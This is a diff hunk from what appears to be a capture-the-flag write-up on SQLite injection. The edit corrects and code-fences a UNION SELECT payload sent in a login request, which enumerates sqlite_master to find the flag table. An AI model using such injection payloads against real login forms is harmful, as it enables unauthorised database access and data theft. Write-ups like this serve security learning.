@@ -82,7 +82,7 @@ and when i got that the database has 3 tables a new repsone got to us:
 from that we knew that its time based sqlite injection, so lets get to work:
 
 first we need to find the name of the table using this query:
-<b>username=username=admin'UNION+SELECT+tbl_name,NULL,NULL+FROM+sqlite_master+WHERE+tbl_name+NOT+LIKE+'sqlite_%'+AND+tbl_name+LIKE+'fla%'+--&password=asd</b>
+```<b>username=admin'UNION+SELECT+tbl_name,NULL,NULL+FROM+sqlite_master+WHERE+tbl_name+NOT+LIKE+'sqlite_%'+AND+tbl_name+LIKE+'fla%'+--&password=asd</b>```
 
 throught enumeration we found that the table name is flag.
 
